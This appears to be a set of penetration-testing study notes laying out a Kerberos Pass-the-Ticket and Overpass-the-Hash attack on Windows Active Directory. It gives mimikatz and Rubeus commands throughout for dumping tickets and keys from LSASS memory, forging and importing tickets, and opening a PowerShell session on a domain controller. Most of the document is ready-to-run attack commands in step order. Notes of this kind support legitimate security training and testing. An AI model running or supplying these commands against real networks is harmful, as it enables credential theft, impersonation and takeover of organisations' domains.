## Requirements to Perform PtT Attacks

- We need a valid **Kerberos ticket** to perform `Pass the Ticket (PtT)`. It can be :-
	- Service Ticket (TGS) to allow access to a particular service or resource.
	- Ticket Granting Ticket (TGT) which we use to request service tickets to allow any resource the user privileges allow.


## 1. Harvesting Kerberos tickets from Windows

- Tickets are processed and stored by the LSASS. Therefore to get a ticket we must communicate with the LSASS and request it.
- As a non administrator user you only get your own tickets but as an administrator you get everything.
- means copying active, pre-authorized Kerberos ticket files (**TGTs and TGSs**) out of LSASS memory. These are temporary `.kirbi` files that allow you to impersonate a user immediately, but they naturally expire within a few hours.
- `.kirbi files` : contains credentials such as **TGT** (Kerberos tickets) and **TGS** (Service tickets). These `.kirbi` files are stored in Windows active memory inside the **LSASS**.

## Exporting Tickets 

### using `mimikatz`

- Tickets ending with `$` correspond to an computer account which needs a ticket to interact with the Active Directory. 
- User tickets have the user's name, followed by an `@` that separates the service domain for example `[randomvalue]-username@service-domain.local.kirbi`.

```mimikatz
privilege::debug
sekurlsa::tickets /export
```

## using `Robeus`

```cmd
Rubeus.exe dump /nowrap
```

**Note:** To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.

---
## Pass the Ticket (PtT) Attack Procedure

#### STEP 1 : Extracting Kerberos Keys (`mimikatz`)

-  means pulling a user's long-term cryptographic credentials (**AES-256, AES-128, or NTLM hashes**) out of memory. These keys never expire on their own—they remain completely valid for as long as the user keeps their current password.

- You will probably get `aes_hmac` and `rcr4_hmac` which are encryption types. These tell us the algorithm used encrypt the Kerberos tickets.

```mimikatz
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```

#### STEP 2: Pass the Key/OverPass the Hash

- You steal a user's **cryptographic key** (like their NTLM hash or AES keys) out of memory or the SAM database. You then present that key directly to the Key Distribution Center (KDC / Domain Controller) to request a brand-new, legitimate Kerberos ticket.


##### via `mimikatz`

- This will create a new `cmd.exe` window that we can use to request access to any service we want in the context of the target user.
- `<KEY_TYPE>` includes :
	- `/rc4`
	- `/aes128`
	- `/aes256`
	- `/ntlm`

```mimikatz
mimikatz.exe
sekurlsa::pth /domain:<DOMAIN_NAME> /user:<USERNAME> /<KEY_TYPE>:<KEY>
```

**OR**
##### via `Rubeus`

- `KEY` is the key extracted during the **Extracting Kerberos Keys** phase.
- `<KEY_TYPE>` includes :
	- `/rc4`
	- `/aes128`
	- `/aes256`
	- `/des`

```cmd
Rubeus.exe asktgt /domain:<DOMAIN_NAME> /user:<USERNAME> /<KEY_TYPE>:<KEY> /nowrap
```


**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

#### STEP 3: Pass the Ticket (PtT)  NON-REMOTE

- a post-exploitation technique where an attacker **steals a valid Kerberos authentication ticket** from a compromised computer and uses it to log into other systems on the network without needing the user's plaintext password. The attacker gains the access of the **stolen user's privileges** inside the network.
- You can choose to perform this using `without kirbi` or `with kirbi` method. ANY ONE.

##### via `Rubeus` (without `.kirbi`)

- If we pass the ticket successfully then we will see `Ticket Successfully imported!` message.
- You will get a `[*] Base64 (ticket.kirbi)` block of plaintext ... that is the **Kerberos Ticket**.

```cmd
Rubeus.exe asktgt /domain:<DOMAIN> /user:plaintext /<KEY_TYPE>:<KEY> /ptt
```


##### via `Rubeus` (using `.kirbi`)

###### a) using `.kirbi` filename METHOD

- If we are able to export tickets during the **Harvesting of Tickets** phase and be able to find those `.kirbi` files we can use them to perform **Pass the Ticket** attack because those `.kirbi` files contain stuff like **TGTs** and **TGSs**.
- During that **Exporting Tickets** phase, the `.kirbi` filename will be shown use that below.

```cmd
Rubeus.exe ptt /ticket:<kirbi_file_name>
```

###### b) using `.kirbi` BASE64 METHOD

- converting the `.kirbi` file contents to **base64**.

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("<kirbi_file_name>"))
```

- executing the pass the ticket using `.kirbi` file's contents as **base64**.

```cmd
Rubeus.exe ptt /ticket:<kirbi_BASE64_text>
```

---
#### STEP 3 : PowerShell Remoting (Pass the Ticket) REMOTE 

##### via `mimikatz`

```cmd
privilege::debug
kerberos::ptt "<path to .kirbi file of that user>\<kirbi_filename>"
```

- After this works, you can log into that **Domain Controller** using `powershell`.
- This can be a domain controller for this scenario but its just a computer name given to that machine in that particular network. 
- After passing the ticket you have gained the privilege to access that account probably so you can use that privilege to log inside that network.

```powershell
Enter-PSSession -ComputerName <Domain_Controller_Name>
```

---









